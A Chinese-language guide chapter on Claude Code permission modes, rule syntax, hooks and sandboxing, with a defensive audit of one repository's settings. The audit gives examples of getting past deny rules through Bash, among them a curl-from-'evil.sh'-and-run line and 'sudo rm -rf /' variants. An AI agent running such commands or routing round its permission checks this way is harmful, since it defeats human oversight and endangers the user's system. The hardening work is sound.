# 04 · 权限与护栏

> **本章要回答的问题**：Claude Code 的权限系统到底能拦住什么、拦不住什么？
> 答案：**权限规则不是安全边界，沙箱才是**。权限规则拦的是"Claude 打算用某个工具"，
> 拦不住"同一个程序被换个写法调用"。

---

## 🧱 三层防线模型

官方把护栏分成三层，各管一段：

| 层 | 机制 | 由谁强制 | 备注 |
|----|------|----------|------|
| 第 3 层 | 外层隔离（容器 / VM） | 操作系统 / 虚拟化 | **唯一真正的安全边界** |
| 第 2 层 | 沙箱（sandbox） | 操作系统 | 限制可达的文件与主机 |
| 第 1 层 | 权限规则 + 权限模式 | Claude Code 自身 | 决定"要不要问"和"能不能" |
| 第 1 层内 | `PreToolUse` hook（策略层） | 你写的脚本 | 可编程地改写 / 放行 / 拒绝 |

**关键区分**（官方原话，务必记住）：

> *"Permission rules are enforced by Claude Code, not by the model. Instructions in your
> prompt or `CLAUDE.md` shape what Claude tries to do, but they don't change what
> Claude Code allows."*

| 层 | 拦截对象 | 谁执行 | 模型能绕过吗 |
|----|---------|-------|------------|
| 权限规则 | 工具调用 | Claude Code | ❌ 不能 |
| 沙箱 | 命令能触达的文件/主机 | 操作系统 | ❌ 不能 |
| CLAUDE.md / skill | 模型的**意图** | 模型 | ⚠️ 只是建议 |

所以：**要"绝不允许"，写在 CLAUDE.md 里没用，必须落在第 1 或第 2 层。**

## 🎚️ 6 种权限模式

| 模式（配置值） | CLI/UI 显示名 | 行为 | 典型场景 |
|--------------|-------------|------|---------|
| `default` | **Manual** | 每个工具首次使用都问 | 敏感工作、陌生代码库 |
| `acceptEdits` | Accept Edits | 自动接受文件编辑 + 常见 fs 命令（`mkdir`/`touch`/`mv`/`cp`，限工作目录内） | 日常改代码 |
| `plan` | Plan | 只读探索，不改源文件；配 auto 模式时分类器批准的命令也能跑 | 改动范围不确定 |
| `auto` | Auto | 无常规提示；shell/网络动作先过**后台分类器**核对是否与请求一致 | 交互式终端默认 |
| `dontAsk` | Dont Ask | **凡是要问的一律拒绝**；只有预先批准的能跑 | 无人工值守 |
| `bypassPermissions` | Bypass | 全部放行（仅隔离容器/VM 内可用） | 容器内自动化 |

> `manual` 是 `default` 的别名，两个都接受。
> **v2.1.284 起，交互式终端与 VS Code 会话默认就是 `auto` 模式**（所有套餐与 provider 生效）。
> 用 `settings.json` 的 `defaultMode` 改会话启动模式。

### 可以在受管设置里禁用危险模式

```json
{ "permissions": { "disableBypassPermissionsMode": "disable",
                   "disableAutoMode": "disable" } }
```

放在 **managed settings** 里才无法被项目/用户设置覆盖 —— 这是企业管控的入口。

## 📜 权限规则语法

### 三类规则

| 形式 | 例子 | 语义 |
|------|------|------|
| **裸工具名** | `Bash` | 匹配该工具的**全部**调用。**作为 deny 时会把工具整个从上下文里移除**，Claude 连看都看不到 |
| **带 specifier** | `Bash(rm *)` / `Read(./.env)` / `WebFetch(domain:example.com)` | 工具保留，只拦匹配的调用 |
| **参数匹配** | `Agent(model:opus)` / `Bash(run_in_background:true)` | 匹配工具输入的**顶层标量字段** |

> **裸名移除的例外**：`EndConversation` 无法被移除（只要还有别的工具在），
> 且 ask 规则不会对它触发。

### 评估顺序：deny → ask → allow

**规则先按类型排序，再按顺序匹配；特异性不影响顺序。**

```
deny 命中  → 拒绝（终结）
ask  命中  → 弹窗确认
allow 命中 → 免批准
```

> ⚠️ **推论**：宽泛的 deny 会压过精确的 allow。
> `Bash(aws *)` 拒绝后，`Bash(aws s3 ls)` 这样的窄 allow **救不回来**。
> 反过来也一样：一条 ask 规则命中时，即使有更精确的 allow，也会弹窗。

### 参数匹配的 6 条限制

1. 参数必须是工具 input 的**直接字段**（嵌套在对象/数组里的不行）
2. 一条规则只管**一个**参数 —— 要同时管 `model` 和 `isolation` 得写两条
3. 值支持 `*` 通配；**不带 `*` 就是精确匹配**（`Agent(model:opus)` 只匹配别名 `opus`，不匹配完整 model ID）
4. 模型**省略**的参数永远不匹配 —— `Agent(model:*)` 不匹配没设 `model` 的调用
5. 值与 Claude 实际发出的字面输入比较，**不做归一化**
6. **不能匹配工具的主内容字段**：`Bash` 的 `command`、`Read/Edit/Write` 的 `file_path`、
   `Grep/Glob` 的 `path`、`WebFetch` 的 `url` —— 这些只能用工具自己的 specifier 语法
   （`Bash(rm *)`、`Read(./path)`、`WebFetch(domain:host)`）。
   写成 `Bash(command:rm *)` 会被**忽略并给出启动警告**（可被复合命令绕过）。

### Bash 通配符：`:` 后缀 = 尾部通配

| 写法 | 匹配 | 不匹配 |
|------|------|--------|
| `Bash(npm run build)` | `npm run build` | `npm run build --watch` |
| `Bash(npm run *)` | `npm run build`、`npm run test --watch` | `npm install` |
| `Bash(git log * main)` | `git log --oneline main` | `git log main` |
| `Bash(ls *)` | `ls -la`、`ls` | `lsof` |
| `Bash(ls*)` | `ls -la`、`lsof` | — |
| `Bash(ls:*)` | ≡ `Bash(ls *)` | — |

**两条容易踩的规则**：

1. **`*` 前的空格是规则的一部分**。`Bash(ls *)` 要求 `ls` 后有空格，所以不匹配 `lsof`；
   `Bash(ls*)` 没有空格，连 `lsof` 一起匹配。
2. **`*` 前的单词决定规则的边界**。`Bash(git *)` 匹配**所有** git 子命令；
   `Bash(git log *)` 只匹配 `git log`。官方会对 `Bash(git * main)` 这类
   "`*` 出现在子命令之前"的 allow 规则**启动告警**。

## 🚫 `deny` 是唯一不可绕过的层

官方原话：*"Deny rules block in every mode, including `bypassPermissions`.
Allow rules have no effect in `bypassPermissions`."*

| 规则类型 | `bypassPermissions` 下 | 其他模式 |
|---------|---------------------|---------|
| `deny` | **仍然拒绝** | 拒绝 |
| `ask` | 仍然弹窗 | 弹窗 |
| `allow` | **无效果**（本来就全放行） | 免批准 |

### 受保护路径（protected paths）

对下列路径的写入**永不被自动批准**（`bypassPermissions` 除外）：

`.git` · `.config/git` · `.vscode` · `.idea` · `.husky` · `.cargo` ·
`.devcontainer` · `.yarn` · `.mvn` · `.claude`（有少量例外，如 `.claude/worktrees/`）

| 模式 | 受保护路径写入 |
|------|--------------|
| `default` / `acceptEdits` | 弹窗 |
| `plan` | 交互式终端且可用 bypass 时放行；否则走分类器或弹窗 |
| `auto` | 交给分类器裁决 |
| `dontAsk` | **拒绝** |
| `bypassPermissions` | 放行 |

> ⚠️ **`permissions.allow` 不能预批准受保护路径的写入** ——
> 安全检查在 allow 规则求值**之前**执行。所以 `Edit(.claude/**)` 写在 settings 里**没用**。
>
> 本仓库的 `.claude/settings.json` 恰好有 `"allow": ["Edit", ...]`（裸名），
> 但 `.claude/` 目录的写入仍然受这条保护 —— 这不是配置疏漏，是设计。

### 任何模式都不会自动批准的动作

即使 `bypassPermissions`：

- 命中 **ask 规则**的工具
- 组织把 connector 工具设为 `ask`
- 需要用户交互的工具：`AskUserQuestion`、标记 `requiresUserInteraction` 的 MCP 工具
- **被识别的 `rm` / `rmdir` 关键路径删除** —— 任何 allow 规则或 `PreToolUse` 的
  `"allow"` 都批准不了
- **跨会话消息的安全护栏**
- 开启 `permissions.blockReadsOutsideWorkingDirectories` 时，读取工作目录之外的文件
  （即使 auto / bypass 也会拦）

## 🪝 PreToolUse hook：可编程的策略层

这是官方给"精细化管控"留的口子。`PreToolUse` 的裁决不是顶层 `decision` 字段，
而是 `hookSpecificOutput` 里的 `permissionDecision`：

**`permissionDecision` 的四个取值**：

| 取值 | 语义 |
|------|------|
| `"allow"` | 跳过权限弹窗（但**不能**跳过"任何模式都不自动批准"的动作） |
| `"deny"` | 阻止该次调用，reason 给 Claude 看 |
| `"ask"` | 弹窗让用户确认，reason 显示在弹窗里 |
| `"defer"` | 结束本轮，稍后恢复该调用（需要 `-p` 非交互模式） |

**其余三个字段**：

| 字段 | 语义 |
|------|------|
| `permissionDecisionReason` | ask 时给用户看；deny 时给 Claude 看；allow/defer 只进 debug log |
| `updatedInput` | **改写工具入参**（整体替换，未改的字段也要带上） |
| `additionalContext` | 注入 Claude 上下文 |

**多个 PreToolUse hook 决策冲突时的优先级**：

```
deny  >  defer  >  ask  >  allow
```

> `updatedInput` 有一个安全细节：Claude Code 会用**hook 返回后的入参**去评估权限规则和
> Bash 的自动后台资格，而不是 Claude 原始发出的入参。
> 也就是说 hook 可以通过改写入参来"改变匹配结果" —— 这既是能力也是攻击面，
> 写 hook 时要清楚这一点。

### hook 退出码语义

| 退出码 | 含义 |
|-------|------|
| `0` | 成功。应用 stdout 的 JSON 输出，动作继续 |
| `2` | **阻断错误**。Claude Code 停止该动作，stderr 作为拒绝原因 |
| 其他 | 非阻断错误。动作**继续**（除非 hook 设了 `onFailure: "block"`） |

stdout 内容与退出码的组合：

| stdout | Exit 0 | Exit 2 | 其他退出码 |
|--------|--------|--------|-----------|
| 合法 JSON | 成功，字段生效 | 阻断，字段不能覆盖阻断 | **忽略退出码**，仅由字段决定 |
| 非法 JSON | 非阻断错误 | 阻断（stderr 是原因） | 非阻断错误 |
| 纯文本 / 无 | 成功 | 阻断 | 非阻断错误 |

特殊事件：`WorktreeCreate` / `WorktreeRemove` **任何非零退出码都失败**，不看 JSON。

## 🏖️ 沙箱：权限之外的第二层

沙箱是**操作系统强制**的边界：Claude 跑的 shell 命令和它们派生的进程都在边界内。

| 访问 | 默认 | 调整方式 |
|------|------|---------|
| **写** | 工作目录 + 每用户临时目录 + 你添加的目录；受保护路径仍拒写 | `sandbox.filesystem.allowWrite` / `denyWrite` |
| **读** | **机器上大部分东西**，包括 `~/.ssh`、`~/.aws/credentials` | `sandbox.filesystem.denyRead` |
| **网络** | **没有直连出口**。流量走本机代理，按 `allowedDomains` 过滤（**默认为空**） | `sandbox.network.allowedDomains` / `deniedDomains` |
| **环境变量** | 从 Claude Code 继承，**包括其中的密钥** | `credentials` / `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` |

### ⚠️ 沙箱**不**覆盖的东西

- **内置文件与网络工具**：`Read`、`Edit`、`Write`、`WebFetch`、`WebSearch`
  → `denyRead` 拦不住 Read 工具；`allowedDomains` 限制不了 WebFetch
- **Claude Code 启动的其他进程**：command 型 hook、本地 MCP server、插件 monitor、
  LSP server、`statusLine` 命令、`apiKeyHelper` → 全部**以完整权限运行**
- **你手输的 `!` shell 命令** → 默认**在沙箱外**运行
- **`excludedCommands` 排除的命令** → 沙箱外
- **Claude 请求的沙箱外重试**（unsandboxed retry）→ 沙箱外

> **要把这些也关进笼子，只能把 Claude Code 进程本身放进容器 / VM。**
> 官方管这叫 [sandbox environments](https://code.claude.com/docs/en/sandbox-environments)。

### 平台限制（对本仓库很重要）

> **沙箱只在 macOS、Linux、WSL2 上可用。原生 Windows 上，Claude Code 的命令不沙箱化。**

macOS 用系统自带的 Seatbelt；Linux / WSL2 依赖 `bubblewrap` 和 `socat`。
本仓库开发环境是 **win32 原生** → 也就是说**第 2 层防线目前根本不存在**。

## 🔍 本仓库现状审计

`.claude/settings.json` 当前配置：

```json
{
  "permissions": {
    "allow": ["Read","Write","Edit","MultiEdit","Bash","WebSearch","WebFetch"],
    "deny":  ["Bash(sudo:*)", "Read(*/secrets/*)", "Edit(.env*)"]
  },
  "hooks": {}
}
```

> ✅ 发现 2 的修复**已落地**（`Write(.env*)` → `Edit(.env*)`）。
> 发现 1、4、5 仍未处理，见下面的「建议配置」。

### 发现 1：`Bash` 裸名 allow + 无沙箱 = 命令执行无边界

`"Bash"` 是**裸工具名 allow**，意思是**所有** Bash 命令都免批准。
同时原生 Windows 上没有沙箱 → Claude 跑的命令实际上**不受任何执行边界约束**。

这不一定是错的（研究分析场景命令多），但要意识到：
**deny 规则是唯一的兜底，而它只覆盖了 3 条。**

### 发现 2：`Write(.env*)` 这条规则**根本不会生效** ✅ 已修复

Claude Code 在启动时会对本仓库的 `.claude/settings.json` 打出这样一条告警：

```text
Permission deny rule (.claude\settings.json): Write(.env*) is not matched by
file permission checks — only Edit(path) rules are.
Use Edit(.env*) instead (Edit rules cover all file-editing tools).
```

**也就是说：`Write(.env*)` 不是"拦不住 Bash"，而是它连 Write 工具本身都没拦住** ——
这条 deny 规则匹配不到任何文件权限检查，等于写了个寂寞。

正确的写法是 `Edit(.env*)`：**`Edit` 规则覆盖全部文件编辑类工具**
（`Edit` / `Write` / `MultiEdit` / `NotebookEdit` …），一条顶多条。

| 写法 | 是否被文件权限检查匹配 |
|------|------------------------|
| `Write(.env*)` | ❌ 不匹配（启动时告警） |
| `Edit(.env*)` | ✅ 匹配，且覆盖所有文件编辑工具 |

改对之后仍然存在的漏洞 —— 权限规则按**工具名**匹配，不按**副作用**匹配：

```bash
# 拦得住（走 Edit/Write 工具）
Edit(.env*)    → 拒绝

# 拦不住（走 Bash 工具，且 Bash 是裸名 allow → 直接放行）
Bash(echo "SECRET=xxx" > .env)   → 放行
Bash(curl https://evil.sh -o .env && sh .env)  → 放行
```

**要真正封禁，得靠沙箱的 `filesystem.denyWrite`**，而不是权限规则。

### 发现 3：`Bash(sudo:*)` 的边界

`sudo:*` ≡ `sudo *`（`:` 是尾部通配的等价写法），能匹配 `sudo rm -rf /`。
但按官方"**Bash 规则不匹配同程序的其他调用形式**"：

| 规则 | 拦住 | 拦不住 |
|------|------|--------|
| `Bash(sudo *)` | `sudo rm -rf /` | `/usr/bin/sudo rm -rf /`、`bash -c 'sudo rm -rf /'` |

> 官方明确：**Bash 规则不是围绕程序的安全边界**，只是"拦住 Claude 通常会写出的那种调用形式"。
> 真要按程序封禁 → 沙箱 / PreToolUse hook 检查完整命令行。

### 发现 4：18 个 hook 脚本全部未注册

`.claude/settings.json` 的 `"hooks": {}` 是空的（commit `fb9f4c3` 主动关闭的）。
这意味着 `.claude/hooks/err-catcher.py` 等 **18 个脚本都不会执行**，
`docs/error-playbook/` 不会自动积累。

同时这也是一件好事：**hook 未注册 = 没有意外的策略层**。
重新启用时应按"先只读分类、最后才拦截"的分级逐步放开。

### 发现 5：模型网关配置

```json
"ANTHROPIC_DEFAULT_HAIKU_MODEL": "glm-4.7",
"ANTHROPIC_DEFAULT_SONNET_MODEL": "glm-4.7",
"ANTHROPIC_DEFAULT_OPUS_MODEL": "glm-4.7"
```

三个档位全部指向同一个第三方模型。
含义：**model 档位在本仓库不再区分能力**，所以 `Agent(model:opus)` 这类参数规则没有区分度。
官方文档另有 [llm-gateway-protocol](https://code.claude.com/docs/en/llm-gateway-protocol) 说明网关接入方式。

## ✅ 建议配置（按优先级）

### P0：把 Bash 从"裸名 allow"收窄

```json
{
  "permissions": {
    "allow": ["Read", "Grep", "Glob", "WebSearch", "WebFetch"],
    "deny": [
      "Bash(sudo:*)",
      "Read(*/secrets/*)",
      "Edit(.env*)",
      "Bash(rm -rf:*)",
      "Bash(git push:*)"
    ]
  }
}
```

> ⚠️ 注意 `Edit(.env*)` 而不是 `Write(.env*)` —— 后者不会被文件权限检查匹配（见发现 2）。

然后按实际工作流**逐条**加回 `Bash(npm run *)`、`Bash(python3:*)`、`Bash(git commit:*)` 等前缀 allow。
每次加一条都跑一次验证，别一次放行一整个类别。

### P0′：显式指定默认权限模式（v2.1.284 起）

**`auto` 模式从 v2.1.284 起成了默认值** —— 不写 `defaultMode` 就是 auto。

本仓库要小心：`auto` 靠一个**分类器**决定"要不要问用户"。
而本仓库的 `env` 把三档模型全指向 `glm-4.7` 网关，分类器在这个链路上不可靠。
所以应当**显式写死**：

```json
{
  "permissions": {
    "defaultMode": "manual",
    "allow": ["..."],
    "deny": ["..."]
  }
}
```

> 6 种模式的完整对照见本章开头的 [「6 种权限模式」](#6-种权限模式)。

> `bypassPermissions` 也拦不住 `deny` —— 这是 deny 值得单独信任的原因。

### P1：加沙箱（需要 WSL2）

原生 Windows 无沙箱是当前最大的缺口。可选方案：

| 方案 | 代价 | 效果 |
|------|------|------|
| 装 WSL2，在 WSL2 里跑 Claude Code | 中 | 拿到 Bash 沙箱 |
| 用 Docker 跑整个 Claude Code 进程 | 中 | 拿到第 3 层隔离 |
| 只靠权限规则 + hook | 低 | 挡住"常见写法"，挡不住变形写法 |

### P2：重新启用 hook（分级）

第一批只放**只读分类 + 记录**（如 `err-catcher.py`），不改任何行为；
确认噪音可接受后，再放**拦截型**（如阻止提交 secrets、阻止改受保护路径）。

拦截型 hook 用 `PreToolUse` + `permissionDecision: "deny"`，退出码 `2` 也能达到同样效果。

### P3：受管设置兜底

如果是团队仓库，把 `disableBypassPermissionsMode` / `disableAutoMode` 放进
managed settings，让项目级配置无法覆盖。
